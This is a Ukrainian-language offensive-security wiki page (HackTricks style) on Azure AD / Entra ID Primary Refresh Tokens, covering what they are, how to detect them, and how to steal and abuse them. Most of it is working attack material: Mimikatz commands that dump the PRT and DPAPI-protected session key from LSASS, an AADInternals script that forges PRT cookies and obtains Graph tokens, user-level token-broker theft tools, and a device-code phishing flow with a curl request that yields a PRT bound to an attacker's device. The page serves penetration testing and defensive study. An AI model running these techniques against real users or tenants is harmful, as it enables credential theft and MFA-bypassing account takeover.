# Az - Primary Refresh Token (PRT)

{{#include ../../../banners/hacktricks-training.md}}

## Що таке Primary Refresh Token (PRT)?

**Primary Refresh Token (PRT)** - це довгостроковий токен оновлення, що використовується в аутентифікації Azure AD (Entra ID), аналогічний Kerberos TGT. Він видається під час входу користувача на пристрій, приєднаний до Azure AD, і може використовуватися для запиту токенів доступу для різних додатків без повторного запиту облікових даних. Кожен PRT супроводжується **ключем сесії** (також званим ключем доказу володіння) - симетричним ключем, що використовується для підписання запитів і доведення того, що клієнт має PRT. Сам PRT є непрозорим, зашифрованим об'єктом (нечитаним клієнтом), тоді як ключ сесії використовується для **підписання** JWT, що містить PRT під час запиту токенів. Іншими словами, володіння лише PRT недостатньо; зловмисник потребує ключа сесії, щоб довести легітимність, подібно до того, як потрібно мати як Kerberos TGT, так і його ключ сесії для аутентифікації.

На Windows PRT і ключ сесії кешуються в процесі LSASS через плагін CloudAP. Якщо пристрій має **TPM** (модуль довірчої платформи), Azure AD прив'язує ключі до TPM для додаткової безпеки. Це означає, що на пристроях з TPM ключ сесії зберігається або використовується в межах TPM так, що його не можна безпосередньо прочитати з пам'яті за звичайних обставин. Якщо TPM недоступний (наприклад, на багатьох віртуальних машинах або старих системах), ключі зберігаються в програмному забезпеченні та захищені шифруванням DPAPI. В обох випадках зловмисник з адміністративними привілеями або виконанням коду на машині може спробувати **вивантажити PRT і ключ сесії з пам'яті** в рамках пост-експлуатації, а потім використовувати їх для підробки користувача в хмарі. 
На відміну від звичайних токенів оновлення (які зазвичай специфічні для додатка), PRT є більш універсальним, дозволяючи вашому пристрою запитувати токени для майже будь-якого ресурсу або служби, інтегрованої з Entra ID.

## Як працює PRT?

Ось спрощене пояснення того, як працює PRT:

1.  **Реєстрація пристрою:**

-   Коли ваш пристрій (наприклад, ноутбук на Windows або мобільний телефон) приєднується або реєструється в Entra ID, він аутентифікується за допомогою ваших облікових даних (ім'я користувача/пароль/MFA).

-   Після успішної аутентифікації Entra ID видає PRT, прив'язаний конкретно до вашого пристрою.

2.  **Зберігання токенів:**

-   PRT надійно зберігається на вашому пристрої, часто захищений апаратними функціями, такими як модуль довірчої платформи (TPM), що забезпечує складність для несанкціонованих осіб витягти або зловживати ним.

3.  **Єдине входження (SSO):**

-   Щоразу, коли ви отримуєте доступ до програми, захищеної Entra ID (наприклад, додатки Microsoft 365, SharePoint, Teams), ваш пристрій безшумно використовує збережений PRT для запиту та отримання конкретного токена доступу для цього додатка.

-   Вам не потрібно повторно вводити свої облікові дані, оскільки PRT прозоро обробляє аутентифікацію.

4.  **Оновлення та безпека:**

-   PRT мають тривалий термін дії (зазвичай близько 14 днів), але постійно оновлюються, поки ваш пристрій активно використовується.

-   Якщо ваш пристрій стає скомпрометованим або втраченим, адміністратори можуть віддалено відкликати ваш PRT, негайно блокуючи несанкціонований доступ.

### Чому PRT потужні?

-   **Універсальний доступ:** На відміну від звичайних токенів, обмежених одним додатком або ресурсом, PRT може полегшити доступ до всіх служб, інтегрованих з Entra ID.

-   **Покращена безпека:** Завдяки вбудованим апаратним захистам (таким як TPM) PRT забезпечують безпечне зберігання та використання токенів.

-   **Досвід користувача:** PRT значно покращують досвід користувача, зменшуючи часті запити на аутентифікацію та забезпечуючи справжнє безшовне SSO.

## Як дізнатися, чи присутній PRT?

- Перевірте, чи присутній PRT:
```bash
# Execute
dsregcmd /status
## Check if the value of AzureAdPrt is set to YES
```
- Перевірте, чи захищено TPM:
```bash
Get-Tpm | Select TpmPresent,TpmReady,TpmEnabled,TpmOwned
# TpmPresent/Ready = True indicates the device can bind secrets to TPM.

dsregcmd /status
# In Device State / WHfB prerequisites you’ll typically see:
# KeyProvider = Microsoft Platform Crypto Provider ⇒ TPM hardware key;
# KeyProvider = Software Key Storage Provider ⇒ not TPM‑bound.
# Some builds also show TpmProtected: YES/NO and KeySignTest (run elevated to test).
```
## Витягування та використання незахищених PRT

Згідно з [цією публікацією](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) на пристроях Windows **без прив'язки до TPM**, PRT та його сеансовий ключ знаходяться в LSASS (плагін CloudAP). Маючи локальні права адміністратора/SYSTEM на цьому пристрої, PRT-об'єкт та сеансовий ключ, зашифрований DPAPI, можна **зчитати з LSASS, сеансовий ключ розшифрувати за допомогою DPAPI, а ключ підпису отримати** для створення дійсного PRT-куки (`x‑ms‑RefreshTokenCredential`). Вам потрібні як PRT, так і його сеансовий ключ — рядка PRT недостатньо.

### Mimikatz
```bash
privilege::debug
sekurlsa::cloudap
```
Поле **PRT** містить зашифрований токен оновлення (зазвичай рядок base64), а KeyValue в ProofOfPossessionKey є зашифрованим за допомогою DPAPI сеансовим ключем (також base64).

Потім, з виходу **`sekurlsa::cloudap`**, скопіюйте blob base64 з **`KeyValue`** всередині поля `ProofOfPossessionKey` (це сеансовий ключ, зашифрований за допомогою DPAPI). Цей зашифрований ключ не може бути використаний у такому вигляді – його потрібно розшифрувати, використовуючи облікові дані DPAPI системи.

Оскільки шифрування DPAPI для системних секретів вимагає контексту системи машини, підніміть свій токен до SYSTEM і використовуйте модуль DPAPI Mimikatz для розшифровки:
```bash
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
```
`token::elevate` буде імплементувати SYSTEM, а команда `dpapi::cloudapkd` з параметром `/unprotect` використає майстер-ключ DPAPI для розшифрування наданого KeyValue блобу. Це дає відкритий текст сесійного ключа, а також пов'язаний Derived Key та Context, використані для підпису:
- **Clear key** – 32-байтовий сесійний ключ у відкритому тексті (представлений у вигляді шістнадцяткового рядка).
- **Derived Key** – 32-байтовий ключ, отриманий з сесійного ключа та значення контексту (більше про це нижче).
- **Context** – 24-байтовий випадковий контекст, який використовувався при отриманні підписного ключа для PRT cookie.

> [!NOTE]
> Якщо це не працює для вас, щоб імплементувати користувача, перевірте наступний розділ, використовуючи **`AADInternals`**.

Тоді ви також можете використовувати mimikatz для генерації дійсного PRT cookie:
```bash
# Context is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# Derivedkey is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# PRT is obtained from sekurlsa::cloudap (filed "Prt"
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
```
Mimikatz виведе підписаний JWT (кукі `PRT`) після рядка “Signature with key”, який містить PRT і підписаний за допомогою похідного ключа. Цей JWT можна скопіювати і використовувати в веб-сесії. Наприклад, зловмисник може відкрити браузер, перейти на `login.microsoftonline.com` і встановити кукі з назвою `x-ms-RefreshTokenCredential` зі значенням цього JWT. Коли браузер оновлюється або переходить, Azure AD буде вважати сесію автентифікованою (кукі PRT подається так, ніби відбулося SSO), і він видасть код авторизації або токен доступу для вказаного ресурсу. На практиці, можна перейти до ресурсу, такого як Office 365 або Azure portal; наявність дійсного кукі PRT означає, що Azure AD надасть доступ без додаткового входу (обминаючи MFA, оскільки PRT вже автентифікований).

Ви також можете використовувати **`roadtx`** і **`roadrecon`** з PRT кукі, щоб видавати себе за користувача *(TODO: Знайти точні команди для використання roadtx/roadrecon для отримання облікових даних з PRT)*.


### AADInternals

Модуль PowerShell **`AADInternals`** також можна використовувати з раніше отриманим PRT і ключем сесії для генерації дійсного токена PRT. Це корисно для автоматизації процесу отримання нового токена PRT з nonce, який можна використовувати для отримання токенів доступу для Azure AD Graph API або інших ресурсів:
```bash
# Code from https://aadinternals.com/post/prt/
# Add the PRT to a variable
$MimikatzPRT = "MS5BVUVCNFdiUV9UZnV2RW13ajlEaFVoR2JCSWM3cWpodG9CZElzblY2TVdtSTJUdENBY1JCQVEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQO...R0RjNFQ0QxaHJ1RFdJeHZUM0stWjJpQVhmMnBLeWpPaHBIOVc"

# Add padding
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}

# Convert from Base 64
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Add the session key (Clear key) to a variable
$MimikatzKey = "7ee0b1f2eccbae440190bf0761bc52099ad7ae7d10d28bd83b67a81a0dfa0808"

# Convert to byte array and base 64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate a new PRTToken with nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey

# Get an access token for MS Graph API
Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
```
Це отримує новий PRT cookie (з nonce) і потім використовує його для отримання токена доступу для Azure AD Graph API (демонструючи доступ до хмари від імені користувача). AADInternals абстрагує більшість криптографії та використовує компоненти Windows або свою власну логіку під капотом.

## Зловживання захищеними PRT

Незважаючи на згадані захисти, зловмисник, який вже скомпрометував пристрій (як локальний користувач або навіть SYSTEM), все ще може **зловживати PRT для отримання нових токенів доступу**, використовуючи власні API токенів Windows та компоненти безпеки. Замість того, щоб **екстрагувати** сирий PRT або ключ, зловмисник фактично **"просить" Windows використовувати PRT від їх імені**. У наступних розділах ми окреслюємо наразі дійсні техніки для зловживання PRT та їх сесійними ключами на актуальних пристроях Windows, де діють захисти TPM. Усі ці техніки припускають доступ після експлуатації на цільовій машині та **зосереджуються на зловживанні вбудованими аутентифікаційними потоками** (не потрібні непатчовані вразливості).

### Архітектура Windows Token Broker та потік SSO

Сучасний Windows обробляє хмарну аутентифікацію через вбудовану **архітектуру токенів брокера**, яка включає компоненти як в режимі користувача, так і в LSASS (Local Security Authority). Ключові елементи цієї архітектури включають:

-   **Плагін CloudAP LSASS:** Коли пристрій приєднано до Azure AD, LSASS завантажує пакети хмарної аутентифікації (наприклад, `CloudAP.dll`, `aadcloudap.dll`, `MicrosoftAccountCloudAP.dll`), які керують PRT та запитами токенів. LSASS (який працює як SYSTEM) організовує зберігання, оновлення та використання PRT, а також взаємодіє з TPM для виконання криптографічних операцій (наприклад, підписання виклику PRT за допомогою сесійного ключа).

-   **Менеджер веб-облікових записів (WAM):** Менеджер веб-облікових записів Windows є фреймворком режиму користувача (доступним через COM/WinRT API), який дозволяє додаткам або браузерам запитувати токени для хмарних облікових записів без запиту облікових даних. WAM діє як брокер між користувацькими додатками та безпечним PRT, підтримуваним LSASS/TPM. Наприклад, бібліотека MSAL від Microsoft та певні компоненти ОС використовують WAM для безшумного отримання токенів, використовуючи PRT увійшовшого користувача.

-   **BrowserCore.exe та інтерфейси COM токенів брокера:** Для SSO в браузері Windows включає компонент під назвою **BrowserCore.exe** (розташований у *Windows Security\BrowserCore*). Це рідний хост повідомлень, який використовують браузери (Edge, Chrome через розширення тощо) для отримання токена SSO, похідного від PRT, для входу в Azure AD. Під капотом BrowserCore використовує об'єкт COM, наданий `MicrosoftAccountTokenProvider.dll`, для отримання cookie/token на основі PRT. По суті, цей інтерфейс COM є API "токен брокера" першої сторони, до якого будь-який процес, що працює як користувач, може звернутися для отримання токена SSO (за умови, що у користувача є дійсний PRT в LSASS).

Коли користувач, приєднаний до Azure AD, намагається отримати доступ до ресурсу (скажімо, Azure Portal), потік зазвичай виглядає так: додаток викликає WAM або інтерфейс COM BrowserCore, який, у свою чергу, взаємодіє з LSASS. LSASS використовує PRT та сесійний ключ (захищений TPM) для створення **SSO токена** -- часто називається **PRT cookie** -- який потім повертається додатку або браузеру. PRT cookie є спеціальним JWT, що містить зашифрований PRT та nonce, підписаний ключем, отриманим з сесійного ключа PRT. Цей cookie надсилається до Azure AD (в заголовку `x-ms-RefreshTokenCredential`), щоб підтвердити, що пристрій та користувач мають дійсний PRT, що дозволяє Azure AD видавати стандартні токени оновлення та доступу OAuth для різних додатків. Важливо, що будь-яке твердження про багатофакторну аутентифікацію (MFA), присутнє в PRT, буде перенесено в токени, отримані через цей процес SSO, що означає, що токени, похідні від PRT, можуть задовольняти ресурси, захищені MFA.

### Крадіжка токенів на рівні користувача (не адміністратор)

Коли зловмисник має **виконання коду на рівні користувача**, захист TPM PRT не заважає зловмиснику отримувати токени. Зловмисник **використовує вбудовані API токенів брокера Windows**:

#### **BrowserCore (MicrosoftAccountTokenProvider COM)**

BrowserCore надає клас COM (`MicrosoftAccountTokenProvider`, CLSID `{a9927f85-a304-4390-8b23-a75f1c668600}`) для отримання PRT cookie. Цей API COM легітимно викликається браузерами (розширеннями Chrome/Edge) для SSO Azure AD.

-   **[RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken)**
```bash
RequestAADRefreshToken.exe --uri https://login.microsoftonline.com
```
*(Повертає токен оновлення Azure AD або cookie PRT)*

- **[ROADtoken](https://github.com/dirkjanm/ROADtoken)** & **[ROADtools](https://github.com/dirkjanm/ROADtools)**
```bash
ROADtoken.exe --nonce <nonce-value>
roadrecon auth --prt-cookie <cookie>
```
*(Генерує nonce, викликає BrowserCore для отримання PRT cookie, а потім викуповує його за допомогою ROADtools)*


### **API менеджера веб-акаунтів (WAM)**

Зловмисники використовують легітимні бібліотеки аутентифікації Microsoft (**MSAL**, **WAM APIs**, **WebAuthenticationCoreManager**) з процесів на рівні користувача для тихого отримання токенів, використовуючи PRT, захищений TPM.


-   **[aadprt](https://posts.specterops.io/)**
```bash
execute-assembly aadprt.exe
```
*(Отримує PRT cookie через COM інтерфейси)*

-   **[listwamaccounts](https://posts.specterops.io/)**
```bash
execute-assembly listwamaccounts.exe
```
*(Перелік облікових записів Azure AD, які увійшли через WAM; визначає цільові токени)*

-   **Загальний приклад (PowerShell з MSAL)**:
```powershell
$app = [Microsoft.Identity.Client.PublicClientApplicationBuilder]::Create("client-id").Build()
$result = $app.AcquireTokenSilent(@("https://graph.microsoft.com/.default"), $app.GetAccountsAsync().Result[0]).ExecuteAsync().Result
$result.AccessToken
```
*(Тихо отримує токен доступу, використовуючи PRT)*

#### Зловживання токеном на рівні адміністратора / SYSTEM

Якщо зловмисник підвищує свої привілеї до **Administrator або SYSTEM**, він може безпосередньо видавати себе за будь-якого користувача, що увійшов в Azure AD, і використовувати ті ж **COM/WAM token broker APIs**. PRT, захищені TPM, не запобігають цьому законному випуску токенів.

### **Видача себе за користувача та отримання токена**

Admin/SYSTEM може видавати себе за активні сесії інших користувачів, щоб викликати BrowserCore або WAM для генерації токенів.

Для цього просто видайте себе за процес користувача (наприклад, `explorer.exe`) і викликайте API токен-брокера, використовуючи будь-яку техніку, прокоментовану в попередньому розділі.

### **Пряме взаємодія з LSASS та токен-брокером (просунуто)**

Адміністратор все ще може працювати з LSASS, щоб зловживати PRT: наприклад, адміністратор може впровадити код у LSASS або викликати внутрішні функції CloudAP, щоб змусити LSASS створити токен. Дослідження Дірка-Яна зазначило, що адміністратор може "взаємодіяти з ключами PRT у LSASS, використовуючи крипто API". На практиці це може означати використання власних функцій LSASS (через техніку, таку як API hooking або RPC, якщо доступно) для генерації cookie PRT. Інший підхід полягає в експлуатації будь-якого вікна, де сесійний ключ може з'явитися в пам'яті – наприклад, в момент оновлення PRT або реєстрації пристрою, коли він не зашифрований для використання. Такі атаки значно складніші та ситуаційні. Простішою тактикою адміністратора є зловживання існуючими дескрипторами токенів або кешами: LSASS кешує нещодавно видані токени оновлення для додатків у пам'яті (зашифровані за допомогою DPAPI). Визначений зловмисник SYSTEM може спробувати витягти ці токени, захищені DPAPI (використовуючи майстер-ключ користувача, який може отримати адміністратор), щоб безпосередньо вкрасти токени оновлення для конкретних додатків. Однак найпростіший і найбільш загальний метод залишається видачею себе за користувача та використанням задокументованих інтерфейсів токен-брокера, оскільки це гарантує, що Azure AD видасть свіжі токени (з усіма належними вимогами), а не намагатися зламати шифрування.

## Фішинг PRT

Зловживайте **OAuth Device Code** потоком, використовуючи **Microsoft Authentication Broker client ID** (**`29d9ed98-a469-4536-ade2-f981bc1d605e`**) та ресурс **Device Registration Service (DRS)**, щоб отримати **токен оновлення, який можна оновити до Primary Refresh Token (PRT)** після реєстрації **шкідливого пристрою**.

### **Чому це працює**

-   **PRT** є **прив'язаним до пристрою** і дозволяє **SSO для (майже) будь-якого додатку, захищеного Entra**.
-   Комбінація **Broker client + DRS** дозволяє фішинговому **токену оновлення** бути **обміняним на PRT** після реєстрації пристрою.
-   **MFA не обходиться**: **користувач виконує MFA** під час фішингу; **вимоги MFA поширюються** на отриманий PRT, дозволяючи зловмиснику отримувати доступ до додатків **без подальших запитів**.

**Передумови**:

-   **Аутентифікація користувача через Device Code** з використанням **Broker client ID** (`29d9ed98-a469-4536-ade2-f981bc1d605e`) та **DRS scopes/resource** (наприклад, **`01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default`** або **`https://enrollment.manage.microsoft.com/`**).
-   **Користувач може реєструвати пристрої** в Entra ID (**за замовчуванням: дозволено**, але може бути обмежено або обмежено квотою).
-   **Відсутність блокуючих політик CA**, які **відключають Device Code** або **вимагають відповідні/гібридні пристрої** для цільових додатків (вони не зупинять випуск PRT, але **зупинять** **використання** його для доступу до захищених додатків).
-   **Хост, контрольований зловмисником**, для запуску потоку та зберігання токенів/ключів пристроїв.

**Потік атаки**:

1.  **Ініціюйте аутентифікацію Device Code** з **client_id = Broker** та **DRS scope/resource**; покажіть **код користувача** жертві.
```bash
curl -s -X POST \
"https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
-d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
-d "scope=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default offline_access openid profile"
```
2.  **Жертва входить на сайт Microsoft** (легітимний інтерфейс) і завершує **MFA** → **зловмисник отримує токен оновлення з обмеженням DRS** для клієнта Broker.

3.  **Зареєструвати підозрілий пристрій** в орендарі, використовуючи цей токен оновлення (об'єкт пристрою створюється і пов'язується з жертвою).

4.  **Оновити до PRT**, обмінюючи **токен оновлення + ідентичність/ключі пристрою** → **PRT** прив'язаний до пристрою зловмисника.

5.  **(Додаткова стійкість)**: якщо MFA була свіжою, **зареєструвати ключ Windows Hello for Business** для підтримки **довгострокового, безпарольного доступу**.

6.  **Зловживання**: обміняти **PRT** (або створити **PRT cookie**) для отримання **токенів доступу** для **Exchange/Graph/SharePoint/Teams/кастомних додатків** від імені користувача.


### Публічні інструменти та докази концепції

- [ROADtools/ROADtx](https://github.com/dirkjanm/ROADtools): Автоматизує OAuth потік, реєстрацію пристроїв та оновлення токенів.
- [DeviceCode2WinHello](https://github.com/kiwids0220/deviceCode2WinHello): Скрипт з одною командою, що автоматизує фішинг коду пристрою до PRT+WHfB ключів.


## Посилання

- [Блоговий пост Діркяна про PRT](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [Пост Діркяна про фішинг PRT](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [Пост Діркяна про зловживання PRT](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- Пост SpecterOps про [Запит токенів Azure AD](https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30)
- [Пост AADInternals про PRT](https://aadinternals.com/post/prt/)
- [blog.3or.de](https://blog.3or.de/understanding-primary-refresh-tokens-and-cve-2021-33779-how-pass-the-prt-was-eliminated#:~:text=,the%20Token%20Broker%20on%20Windows)

{{#include ../../../banners/hacktricks-training.md}}
